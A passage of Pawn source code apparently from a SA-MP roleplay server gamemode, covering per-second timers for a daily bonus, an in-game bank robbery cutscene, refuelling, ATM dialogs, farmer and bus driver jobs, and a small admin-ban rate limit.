					new pp = 1 + random(30) * PlayerInfo[playerid][pLevel] / 3;
					format(MGLOBAL, sizeof(MGLOBAL), "%s_Premium_Points",FormatNumber(pp));
					PlayerTextDrawSetString(playerid, DailyTD[32], MGLOBAL);
					PlayerTextDrawShow(playerid, DailyTD[32]);
				}
				if(castig2 == 3)
				{
					PlayerTextDrawSetPreviewRot(playerid, DailyTD[31], 180.000000, 0.000000, 90.000000, 1.000000);
					PlayerTextDrawSetPreviewModel(playerid, DailyTD[31], 1318);
					PlayerTextDrawShow(playerid, DailyTD[31]);
					new levelrp = random(10);
					new lvlrp;
					if(levelrp == 0 || levelrp == 1 || levelrp == 4 || levelrp == 7 || levelrp == 10) lvlrp = 1;
					if(levelrp == 2 || levelrp == 3 || levelrp == 5 || levelrp == 6 || levelrp == 8 || levelrp == 9) lvlrp = 2;	
					if(lvlrp == 1)
					{
						new rp = 1 + random(5);
						PlayerInfo[playerid][pExp] += rp;
						Update(playerid, pRP);
						format(MGLOBAL, sizeof(MGLOBAL), "%s_Respect_Points",FormatNumber(rp));
						PlayerTextDrawSetString(playerid, DailyTD[32], MGLOBAL);
						
					}
					if(lvlrp == 2)
					{
						PlayerTextDrawSetString(playerid, DailyTD[32], "LEVEL_UP");
						PlayerInfo[playerid][pLevel] += 1;
						Update(playerid, pLevelx);
						format(MGLOBAL, sizeof(MGLOBAL), "Well Done! You win a Level UP!");
						ShowPlayerDialog(playerid, DIALOG_DBONUS, DIALOG_STYLE_MSGBOX, "Daily Bonus - Castig", MGLOBAL, "OK", "");
					}
					PlayerTextDrawShow(playerid, DailyTD[32]);
				}
			}
			rotiredailybonus[playerid]--;
		}
		if(rotiredailybonus[playerid] == 0)
		{
			rotiredailybonus[playerid] = -1;
		}
		if(timercasatorie[playerid] > 0) timercasatorie[playerid]--;
		if(timercasatorie[playerid] == 0) timercasatorie[playerid] = -1;
		if(limitabanuri[playerid] > 0)
		{
			limitabanuri[playerid]--;
			if(banuriinminut[playerid] >= 5)
			{
				limitabanuri[playerid] = -1;
				PlayerInfo[playerid][pAdmin] = 0;
				banuriinminut[playerid] = 0;
				SCM(playerid, COLOR_SERVER, "Protection: You got remove because you made too many bans in a minute.");
			}
		}	
		if(limitabanuri[playerid] == 0)
		{
			banuriinminut[playerid] = 0;
			limitabanuri[playerid] = -1;
		}
		if(TonomatTime[playerid] > 0) TonomatTime[playerid]--;
		if(TonomatTime[playerid] == 0) TonomatTime[playerid] = -1;
		if(RobTimer[playerid] > 0) RobTimer[playerid]--;
		if(RobTimer[playerid] == 0)
		{
			if(BusinessRob[playerid] == 99)
			{
				BusinessRob[playerid] = 0;
				SetCameraBehindPlayer(playerid);
				ClearAnimations(playerid);
				TogglePlayerControllable(playerid, 1);
			}
			if(BusinessRob[playerid] == 3)
			{
				SetCameraBehindPlayer(playerid);
				ClearAnimations(playerid);
				RobTime[playerid] = 10;
				BusinessRob[playerid] = 2;
				RobTimer[playerid] = 5;
				SetPlayerVirtualWorld(playerid, playerid+1);
				new str1[256];
				format(str1,sizeof(str1),"WANTED SCADE IN: ~r~%d MINUTE",wantedlost[playerid]/60+1);
				PlayerTextDrawSetString(playerid, WantedText[playerid], str1);
				WantedPoints[playerid] = 12;
				SetPlayerCriminal(playerid,255, "armed robbery");
				Update(playerid,pRobx);
				Update(playerid,pWantedLevelx);
				DestroyDynamic3DTextLabel(WantedScris[playerid]);
				Tigaanel[playerid] = 1;
				new str2[256];
				format(str2,sizeof(str2),"{FF6600}Wanted Level: %d", PlayerInfo[playerid][pWantedLevel]);
				WantedScris[playerid] = CreateDynamic3DTextLabel(str2, COLOR_SERVER, 0, 0, -20, 20, playerid);
				Streamer_SetFloatData(STREAMER_TYPE_3D_TEXT_LABEL, WantedScris[playerid] , E_STREAMER_ATTACH_OFFSET_Z, 0.48);
				if(UsedFind[playerid] == 1)
				{
					UsedFind[playerid] = 0;
					DisablePlayerCheckpoint(playerid);
					foreach(Player, i)
					{
						if(IsACop(playerid))
						{
							if(caser[playerid] == i)
							{
								cased[i] --;
								caser[playerid] = 1001;
							}
						}
					}
				}
				//|----------camerarob2----------|
				actorbanca[playerid] = CreateActor(46, 1048.4889,-359.3484,9.2367,177.6337);
				SetActorVirtualWorld(actorbanca[playerid], playerid+1);
				ApplyActorAnimation(actorbanca[playerid], "COP_AMBIENT", "Coplook_loop", 4.1, 0, 0, 0, 1, 0);
				SetActorInvulnerable(actorbanca[playerid], 0);				
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				InterpolateCameraPos(playerid, 1058.457397, -358.283782, 11.033020, 1046.029174, -362.708801, 10.937894, 3000);
				InterpolateCameraLookAt(playerid, 1054.346679, -360.841796, 9.784649, 1049.192749, -359.307006, 9.088668, 3000);
			}
			else if(BusinessRob[playerid] == 2)
			{
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SCM(playerid, COLOR_SERVER, "");
				SetCameraBehindPlayer(playerid);
				BusinessRob[playerid] = 4;
				TogglePlayerControllable(playerid, 1);
				banirob[playerid] = 1;
				SetPlayerAttachedObject(playerid,0, 1550,18,-0.135000,0.429999,-0.000000,-128.500000,-523.000000,-61.000000,1.000000,1.000000,1.000000);
				SCM(playerid, COLOR_SERVER, "{0066FF}Banker {FFFFFF}police said about breaking the vault, go and kill-l.");
				SCM(playerid, COLOR_SERVER, "You have found a {0066FF}AK-47 {FFFFFF}And a{0066FF}Deagle {FFFFFF}In Safe.");
				GivePlayerWeaponEx(playerid, 24, 100);
				GivePlayerWeaponEx(playerid, 30, 100);
			}
		}
		if(RefuelTime[playerid] > 0) RefuelTime[playerid]--;
		if(RefuelTime[playerid] == 0)
		{
			TogglePlayerControllable(playerid, 1);
			RefuelTime[playerid] = -1;
			new VID,
	    	FillUp;
			VID = GetPlayerVehicleID(playerid);
			FillUp = GasMax - Gas[VID];
			new Incarcare = GasMax - Gas[VID];
			FillUp = FillUp * 20;
			if(Refueling[playerid] == 1)
			{
				if(GetPlayerCash(playerid) >= FillUp)
				{
					if(Gas[VID] <= 99)
					{
						Gas[VID] += Incarcare;
					}
					else
					{
						Gas[VID] = 100;
					}
					format(string,sizeof(string),"You Paid $%s to tank car.",FormatNumber(FillUp));
					SendClientMessage(playerid,COLOR_GREEN,string);
					GivePlayerCash(playerid, - FillUp);
					Refueling[playerid] = 0;
					new str[184];
					Update(playerid, pCashx);
					if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[33][bEntranceX],BizzInfo[33][bEntranceY],BizzInfo[33][bEntranceZ]))
					{
						BizzInfo[33][bTill] += FillUp;
						mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='33'",BizzInfo[33][bTill]);
						mysql_tquery(SQL,str,"","");
					}
					else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[42][bEntranceX],BizzInfo[42][bEntranceY],BizzInfo[42][bEntranceZ]))
					{
						BizzInfo[42][bTill] += FillUp;
						mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='42'",BizzInfo[42][bTill]);
						mysql_tquery(SQL,str,"","");
					}
					else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[43][bEntranceX],BizzInfo[43][bEntranceY],BizzInfo[43][bEntranceZ]))
					{
						BizzInfo[43][bTill] += FillUp;
						mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='43'",BizzInfo[43][bTill]);
						mysql_tquery(SQL,str,"","");
					}
					else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[44][bEntranceX],BizzInfo[44][bEntranceY],BizzInfo[44][bEntranceZ]))
					{
						BizzInfo[44][bTill] += FillUp;
						mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='44'",BizzInfo[44][bTill]);
						mysql_tquery(SQL,str,"","");
					}
					else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[45][bEntranceX],BizzInfo[45][bEntranceY],BizzInfo[45][bEntranceZ]))
					{
						BizzInfo[45][bTill] += FillUp;
						mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='45'",BizzInfo[45][bTill]);
						mysql_tquery(SQL,str,"","");
					}
					else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[46][bEntranceX],BizzInfo[46][bEntranceY],BizzInfo[46][bEntranceZ]))
					{
						BizzInfo[46][bTill] += FillUp;
						mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='46'",BizzInfo[46][bTill]);
						mysql_tquery(SQL,str,"","");
					}
					else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[47][bEntranceX],BizzInfo[47][bEntranceY],BizzInfo[47][bEntranceZ]))
					{
						BizzInfo[47][bTill] += FillUp;
						mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='47'",BizzInfo[47][bTill]);
						mysql_tquery(SQL,str,"","");
					}
					else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[48][bEntranceX],BizzInfo[48][bEntranceY],BizzInfo[48][bEntranceZ]))
					{
						BizzInfo[48][bTill] += FillUp;
						mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='48'",BizzInfo[48][bTill]);
						mysql_tquery(SQL,str,"","");
					}
					else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[49][bEntranceX],BizzInfo[49][bEntranceY],BizzInfo[49][bEntranceZ]))
					{
						BizzInfo[49][bTill] += FillUp;
						mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='49'",BizzInfo[49][bTill]);
						mysql_tquery(SQL,str,"","");
					}
					else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[50][bEntranceX],BizzInfo[50][bEntranceY],BizzInfo[50][bEntranceZ]))
					{
						BizzInfo[50][bTill] += FillUp;
						mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='50'",BizzInfo[50][bTill]);
						mysql_tquery(SQL,str,"","");
					}
				}
				else
				{
					format(string,sizeof(string),"* Not enough Money to refill, it costs $%d to fill your Vehicle.",FillUp);
					SendClientMessage(playerid,COLOR_LIGHTBLUE,string);
				}
			}
		}
		if(timercuvantcheie[playerid] > 0)
		{
			timercuvantcheie[playerid]--;
		}
		if(timercuvantcheie[playerid] == 0)
		{
			timercuvantcheie[playerid] = -1;
			if(gPlayerLogged[playerid] == 0)
			{
				SCM(playerid, COLOR_ERROR, "You did not enter the keyword in your time, that's why you were disconnected.");
				Kick(playerid);
			}	
		}
		if(Cash[playerid] != GetPlayerMoney(playerid))
    	{
    	    new hack = GetPlayerMoney(playerid) - Cash[playerid];
			if(hack != 0)
			{
				ResetPlayerMoney(playerid);
				GivePlayerMoney(playerid, Cash[playerid]);
			}
    	}
	    if(IsPlayerConnected(playerid))
	    {
	        if(atmtransfer[playerid] > 0)
		 	{
		 	    atmtransfer[playerid]--;
		 	}
		 	if(atmtransfer[playerid] == 0)
		 	{
		 	    atmtransfer[playerid] = -1;
		 	    SCM(playerid, COLOR_ERROR, "Did you get access to use the [/transfer].");
		 	    accestransfer[playerid] = 1;
	 	     	format(string, sizeof(string), "Use (/transfer).");
			    PlayerTextDrawSetString(playerid, ATMTD[playerid][10],string);
			    PlayerTextDrawShow(playerid, ATMTD[playerid][10]);
		 	}
	        if(atmretragere[playerid] > 0)
	        {
	            atmretragere[playerid]--;
	        }
	        if(atmretragere[playerid] == 0)
	        {
	            atmretragere[playerid] = -1;
	            format(string, sizeof(string), "Processing done ...");
			    PlayerTextDrawSetString(playerid, ATMTD[playerid][10],string);
			    PlayerTextDrawShow(playerid, ATMTD[playerid][10]);
				ShowPlayerDialog(playerid, DIALOG_RETRAGERE, DIALOG_STYLE_INPUT, "ATM - Cash withdrawal", "Enter the amount you withdraw from your bank account.", "Withdraw", "CANCEL");
	        }
	        if(atminterogare[playerid] > 0)
	        {
	            atminterogare[playerid]--;
	        }
	        if(atminterogare[playerid] == 0)
	        {
				new mymoney[LY_STRING_LEN];  
				GetLYString(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], mymoney);
	            atminterogare[playerid] = -1;
	            format(string, sizeof(string), "SOLD: ~g~$~r~%s",FormatBigNumber(mymoney));
			    PlayerTextDrawSetString(playerid, ATMTD[playerid][10],string);
			    PlayerTextDrawShow(playerid, ATMTD[playerid][10]);
	        }
	        if(wait5sec[playerid] > 0)
	        {
	            wait5sec[playerid]--;
	        }
	        if(wait5sec[playerid] == 0)
	        {
	            wait5sec[playerid] = -1;
	        	ShowPlayerDialog(playerid, DIALOG_CHOOSECLANTAG, DIALOG_STYLE_INPUT, "Clan tag", "Insert clan tag in the box below:\n(You can't change it after that!)", "Ok", "");
			}
			if(timerreport[playerid] > 0)
	        {
	            timerreport[playerid]--;
		 	}
		 	if(timerreport[playerid] == 0)
		 	{
		 	    timerreport[playerid] = -1;
	            ReportTime[playerid] = 0;
				format(reporttext[playerid], 30, "NULL");
				reportcheater[playerid] = -1;
				reportreason[playerid] = 0;
				if(playerreported[playerid] != -1)
				{
					reportreason[playerreported[playerid]] = 0;
				}
				playerreported[playerid] = -1;
	        }
	        if(farmerc[playerid] == 1)
			{
				PlayerTextDrawShow(playerid, farmtime[playerid]);
			    PlayerTextDrawShow(playerid, farmjob[playerid]);
				PlayerTextDrawShow(playerid, farmbox[playerid]);
				PlayerTextDrawShow(playerid, farmtime[playerid]);
			    if(IsPlayerInRangeOfPoint(playerid,270.0,-388.4804,-1395.7417,23.4229))
			    {
					new tmpcar = GetPlayerVehicleID(playerid),
						ccar = IsPlayerInAnyVehicle(playerid),
						spe = Carspeed(playerid);
					GetPlayerPos(playerid, PlayerPos[playerid][0], PlayerPos[playerid][1], PlayerPos[playerid][2]);
					if(PlayerPos[playerid][0] == PlayerPos[playerid][3] && PlayerPos[playerid][1] == PlayerPos[playerid][4] && PlayerPos[playerid][2] == PlayerPos[playerid][5]) return PlayerTextDrawShow(playerid, farmspeed[playerid]);
					PlayerPos[playerid][3] = PlayerPos[playerid][0];
					PlayerPos[playerid][4] = PlayerPos[playerid][1];
					PlayerPos[playerid][5] = PlayerPos[playerid][2];
					if(ccar && IsAFarmer(tmpcar) && spe > 24)
					{
					    PlayerTextDrawHide(playerid, farmspeed[playerid]);
					    PlayerTextDrawHide(playerid, farmwanted[playerid]);
						if(farmertime[playerid] >= 1)
						{
							farmertime[playerid]--;
							new str2[128];
							format(str2,sizeof(str2),"Work for another ~r~%d ~w~ Seconds to be paid.",farmertime[playerid]);
							PlayerTextDrawSetString(playerid, farmtime[playerid], str2);
							PlayerTextDrawShow(playerid, farmtime[playerid]);
						}
						else if(farmertime[playerid] == 0)
						{
						    new str3[128];
						    farmertime[playerid] = 1;
							farmerc[playerid] = 0;
							SetVehicleToRespawn(tmpcar);
							new randomtransport = random(10);
							if(randomtransport > 8)
							{
								new randfarmer = 50000 + random(50000);
								format(str3,sizeof(str3),"{FFFF00}Farm owners were very satisfied with their work. You got $%s.",FormatNumber(randfarmer));
								SCM(playerid,COLOR_SERVER,str3);
								GivePlayerCash(playerid,randfarmer);
								Update(playerid, pCashx);
							}
							else if(randomtransport >= 0 && randomtransport <= 8)
							{
							    new faina = 90 + random(10);
							    AreFaina[playerid] = faina;
							    SendClientMessage(playerid, COLOR_GREEN, "Farm owners have no money to pay you, but I can give you a bag of flour as a reward.");
								format(str3,sizeof(str3),"You received a bag containing %d kg of flour.", faina);
								SendClientMessage(playerid, COLOR_GREEN, str3);
							    new randsms = random(4);
							    if(randsms == 0)
							    {
							    	SendClientMessage(playerid, COLOR_YELLOW, "SMS de la Aurel.Tractoristul (0554443): You can go to fast food outlets in the area to sell flour.");
								}
								else if(randsms == 1)
							    {
							    	SendClientMessage(playerid, COLOR_YELLOW, "SMS de la Marian.Tractoristul (0554443): You can go to fast food outlets in the area to sell flour.");
								}
								else if(randsms == 2)
							    {
							    	SendClientMessage(playerid, COLOR_YELLOW, "SMS de la Mihai.Fermierul (0554443): You can go to fast food outlets in the area to sell flour.");
								}
		                        else if(randsms == 3)
							    {
							    	SendClientMessage(playerid, COLOR_YELLOW, "SMS de la Gigel.Fermierul (0554443): You can go to fast food outlets in the area to sell flour.");
								}
							}
							PlayerTextDrawHide(playerid, farmtime[playerid]);
							PlayerTextDrawHide(playerid, farmjob[playerid]);
							PlayerTextDrawHide(playerid, farmbox[playerid]);
							PlayerTextDrawHide(playerid, farmspeed[playerid]);
							PlayerTextDrawHide(playerid, farmwanted[playerid]);
							KillTimer(timerfarmm[playerid]);
						}
					}
					else
					{
					    PlayerTextDrawShow(playerid, farmspeed[playerid]);
					}
				}
				else
				{
				    PlayerTextDrawHide(playerid, farmspeed[playerid]);
					PlayerTextDrawShow(playerid, farmwanted[playerid]);
				}
			}
	        if(citeste10sec[playerid] > 0)
	        {
	            citeste10sec[playerid]--;
	        }
	        if(citeste10sec[playerid] == 0)
	        {
	            citeste10sec[playerid] = -1;
	        }
			if(freetimer[playerid] > 0)
		    {
		        freetimer[playerid]--;
		    }
		    if(freetimer[playerid] == 0)
		    {
		        freetimer[playerid] = -1;
	       		TimerFree[playerid] = 0;
				FreeOffer[FreePlayer[playerid]] = -1;
				FreePrice[FreePlayer[playerid]] = 0;
				FreePlayer[playerid] = -1;
				SCM(playerid , COLOR_SERVER, "(Free Timer) Free offer has expired, now you can give someone else free.");
		    }
		    if(timersoo[playerid] > 0)
		    {
		        timersoo[playerid]--;
		    }
			if(timersoo[playerid] == 0)
			{
			    timersoo[playerid] = -1;
			    SomatePermission[playerid] = 1;
			}
			if(secundepanalaad[playerid] > 0)
		 	{
		 	    secundepanalaad[playerid]--;
		 	}
		 	if(secundepanalaad[playerid] == 1)
	   		{
	     		secundepanalaad[playerid] = -1;
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string,sizeof(string),"Ad by %s (phone: {FFFFFF}%d{3DA614}): %s",sendername,PlayerInfo[playerid][pPnumber],AdvMSG[playerid]);
				foreach(Player, i)
				{
					if(i != playerid || PlayerInfo[i][pAdmin] == 0)
					{
						SendSplitMessage(i, COLOR_ADV, string);
					}
				}
				SendClientMessage(playerid, COLOR_GREEN, "Ad-ul tau:");
				format(string,sizeof(string),"Ad by %s (phone: {FFFFFF}%d{33AA33}): %s",sendername,PlayerInfo[playerid][pPnumber],AdvMSG[playerid]);
				SendClientMessage(playerid, COLOR_GREEN, string);
				SendClientMessage(playerid, COLOR_ERROR, "Now you can place a new /ad.");
				AdvPlayer[playerid] = 0;
				format(AdvMSG[playerid], 256, "");
	    	}
	    }
 	}
    new year,month,day,hours,minutes,seconds;
    getdate(year, month, day), gettime(hours, minutes, seconds);
    format(string, sizeof string, "%s%d.%s%d.%s%d",((day < 10) ? ("0") : ("")), day, ((month < 10) ? ("0") : ("")), month, (year < 10) ? ("0") : (""), year);
    TextDrawSetString(Date, string);
    format(string, sizeof string, "%s%d:%s%d", (hours < 10) ? ("0") : (""), hours, (minutes < 10) ? ("0") : (""), minutes, (seconds < 10) ? ("0") : (""), seconds);
    TextDrawSetString(Time, string);
	if(eventon == 1)
	{
		if(giveexp == GetOnLinePlayers())
		{
			foreach(Player,i)
			{
			    if(gPlayerLogged[i] == 1)
	   			{
					PlayerInfo[i][pExp] += recivedexp;
		  			GivePlayerCash(i, recivedmoney);
		  			format(string,sizeof(string),"{FFB870}The server reach %d players online.",GetOnLinePlayers());
					SendClientMessage(i,COLOR_SERVER,string);
				 	format(string,sizeof(string),"{FFB870}You received %s$ and %d respect points.",FormatNumber(recivedmoney),recivedexp);
					SendClientMessage(i,COLOR_SERVER,string);
				}
	  		}
	  		eventon = 0;
	  		giveexp += 20;
		}
	}
	foreach(Player,k)
	{
		if(IsPlayerAFK[k] < 40)
		{
			PlayerInfo[k][pPayDay] += 1;
		}
	}
	if(DeelayWar[4] > 0)
	{
		DeelayWar[4]--;
	}
	if(DeelayWar[5] > 0)
	{
		DeelayWar[5]--;
	}
	if(DeelayWar[6] > 0)
	{
		DeelayWar[6]--;
	}
	if(DeelayWar[10] > 0)
	{
		DeelayWar[10]--;
	}
	return 1;
}
public SomateExpire(playerid)
{
	if(somated[playerid] != -1)
	{
		somated[playerid] = -1;
		somatename[playerid] = "NULL";
		KillTimer(soexpire[playerid]);
	}
	return 1;
}

public BusDriverCheck(playerid)
{
	if(CheckBus[playerid] >= 1)
	{
	    new money,
	    	totalmoney,
	    	string[MAX_STRING],
			string2[MAX_STRING];
		money = 3500 + random(1000);
		if(PlayerInfo[playerid][pBusSkill] == 1) totalmoney = money;
		if(PlayerInfo[playerid][pBusSkill] == 2) totalmoney = money + money*(10/100);
		if(PlayerInfo[playerid][pBusSkill] == 3) totalmoney = money + money*(20/100);
		if(PlayerInfo[playerid][pBusSkill] == 4) totalmoney = money + money*(30/100);
		if(PlayerInfo[playerid][pBusSkill] == 5) totalmoney = money + money*(40/100);
		if(PlayerInfo[playerid][pBusSkill] == 6) totalmoney = money + money*(50/100);
		GivePlayerCash(playerid, totalmoney);
		format(string2,sizeof(string2),"You Got $%s. Go to the next checkpoint.", FormatNumber(totalmoney));
		SendClientMessage(playerid, COLOR_GREEN, string2);
		DisablePlayerRaceCheckpoint(playerid);
	    JobStep[playerid] ++;
		BusCheckk[playerid] ++;
		if(BusCheckk[playerid] >= 10)
		{
			BusCheckk[playerid] = 0;
			PlayerInfo[playerid][pBusRem]--;
			PlayerInfo[playerid][pBusTimes]++;
			Update(playerid,pBusRemx);
			Update(playerid,pBusTimesx);
			if(PlayerInfo[playerid][pBusSkill] <= 5)
			{
				if(PlayerInfo[playerid][pBusRem] <= 0)
				{
					PlayerInfo[playerid][pBusSkill]++;
					if(PlayerInfo[playerid][pBusSkill] == 2)
					{
						PlayerInfo[playerid][pBusRem] = 34;
					}
					else if(PlayerInfo[playerid][pBusSkill] == 3)
					{
						PlayerInfo[playerid][pBusRem] = 49;
					}
					else if(PlayerInfo[playerid][pBusSkill] == 4)
					{
						PlayerInfo[playerid][pBusRem] = 89;
					}
					else if(PlayerInfo[playerid][pBusSkill] == 5)
					{
						PlayerInfo[playerid][pBusRem] = 99;
					}
					Update(playerid,pBusSkillx);
					Update(playerid,pBusRemx);
					format(string,sizeof(string),"Congratulations! You now have skill %d for this job!",PlayerInfo[playerid][pBusSkill]);
					SendClientMessage(playerid, COLOR_YELLOW, string);
				}
			}
		}
	    KillTimer(timerbus[playerid]);
	    format(string,sizeof(string),"~w~CHECKPOINTS: ~r~%d~w~/~r~59", JobStep[playerid]);
	    PlayerTextDrawSetString(playerid, BusCheck[playerid], string);
		PlayerTextDrawShow(playerid, BusCheck[playerid]);
	    if(JobStep[playerid] == 1) SetPlayerRaceCheckpoint(playerid, 0, 1941.3706,-2169.2083,13.4851,1964.6262,-1899.2827,13.4838,4.0);
	    if(JobStep[playerid] == 2) SetPlayerRaceCheckpoint(playerid, 0, 1964.6262,-1899.2827,13.4838,1921.6910,-1749.1346,13.4828,4.0);
	    if(JobStep[playerid] == 3) SetPlayerRaceCheckpoint(playerid, 0, 1921.6910,-1749.1346,13.4828,1819.4100,-1814.2385,13.505	,4.0);
	    if(JobStep[playerid] == 4) SetPlayerRaceCheckpoint(playerid, 0, 1819.4100,-1814.2385,13.5056,1692.2909,-1764.9092,13.4875,4.0);
	    if(JobStep[playerid] == 5) SetPlayerRaceCheckpoint(playerid, 0, 1692.2909,-1764.9092,13.4875,1395.2542,-1729.2012,13.4901,4.0);
	    if(JobStep[playerid] == 6) SetPlayerRaceCheckpoint(playerid, 0, 1395.2542,-1729.2012,13.4901,1315.4188,-1631.5197,13.4827,4.0);
	    if(JobStep[playerid] == 7) SetPlayerRaceCheckpoint(playerid, 0, 1315.4188,-1631.5197,13.4827,1325.5859,-1392.4742,13.4741,4.0);
	    if(JobStep[playerid] == 8) SetPlayerRaceCheckpoint(playerid, 0, 1325.5859,-1392.4742,13.4741,1209.0767,-1324.8274,13.5002,4.0);
	    if(JobStep[playerid] == 9) SetPlayerRaceCheckpoint(playerid, 0, 1209.0767,-1324.8274,13.5002,1082.8730,-1277.8145,13.5019,4.0);
	    if(JobStep[playerid] == 10) SetPlayerRaceCheckpoint(playerid, 0, 1082.8730,-1277.8145,13.5019,966.0933,-1218.3807,16.8770,4.0);
	    if(JobStep[playerid] == 11) SetPlayerRaceCheckpoint(playerid, 0, 966.0933,-1218.3807,16.8770,818.9665,-1137.8669,23.8506,4.0);
	    if(JobStep[playerid] == 12) SetPlayerRaceCheckpoint(playerid, 0, 818.9665,-1137.8669,23.8506,794.1818,-1301.3213,13.4795,4.0);
	    if(JobStep[playerid] == 13) SetPlayerRaceCheckpoint(playerid, 0, 794.1818,-1301.3213,13.4795,678.5087,-1392.8485,13.5081,4.0);
	    if(JobStep[playerid] == 14) SetPlayerRaceCheckpoint(playerid, 0, 678.5087,-1392.8485,13.5081,380.8662,-1492.7212,32.2020,4.0);
	    if(JobStep[playerid] == 15) SetPlayerRaceCheckpoint(playerid, 0, 380.8662,-1492.7212,32.2020,258.5574,-1537.6969,32.3608,4.0);
	    if(JobStep[playerid] == 16) SetPlayerRaceCheckpoint(playerid, 0, 258.5574,-1537.6969,32.3608,484.7990,-1357.7792,17.9893,4.0);
	    if(JobStep[playerid] == 17) SetPlayerRaceCheckpoint(playerid, 0, 484.7990,-1357.7792,17.9893,588.3983,-1232.8560,17.8009,4.0);
	    if(JobStep[playerid] == 18) SetPlayerRaceCheckpoint(playerid, 0, 588.3983,-1232.8560,17.8009,774.5882,-1058.5305,24.5938,4.0);
	    if(JobStep[playerid] == 19) SetPlayerRaceCheckpoint(playerid, 0, 774.5882,-1058.5305,24.5938,1209.5120,-948.5093,42.8005,4.0);
	    if(JobStep[playerid] == 20) SetPlayerRaceCheckpoint(playerid, 0, 1209.5120,-948.5093,42.8005,1566.5400,-997.7548,45.7116,4.0);
	    if(JobStep[playerid] == 21) SetPlayerRaceCheckpoint(playerid, 0, 1566.5400,-997.7548,45.7116,1709.9061,-733.8804,50.0985,4.0);
	    if(JobStep[playerid] == 22) SetPlayerRaceCheckpoint(playerid, 0, 1709.9061,-733.8804,50.0985,1658.8318,-43.4300,36.4876,4.0);
	    if(JobStep[playerid] == 23) SetPlayerRaceCheckpoint(playerid, 0, 1658.8318,-43.4300,36.4876,1772.3663,581.9141,23.7034,4.0);
	    if(JobStep[playerid] == 24) SetPlayerRaceCheckpoint(playerid, 0, 1772.3663,581.9141,23.7034,1841.4648,829.6874,9.9861,4.0);
	    if(JobStep[playerid] == 25) SetPlayerRaceCheckpoint(playerid, 0, 1841.4648,829.6874,9.9861,2187.5762,806.9039,7.2061,4.0);
	    if(JobStep[playerid] == 26) SetPlayerRaceCheckpoint(playerid, 0, 2187.5762,806.9039,7.2061,2290.9165,841.0883,13.9592,4.0);
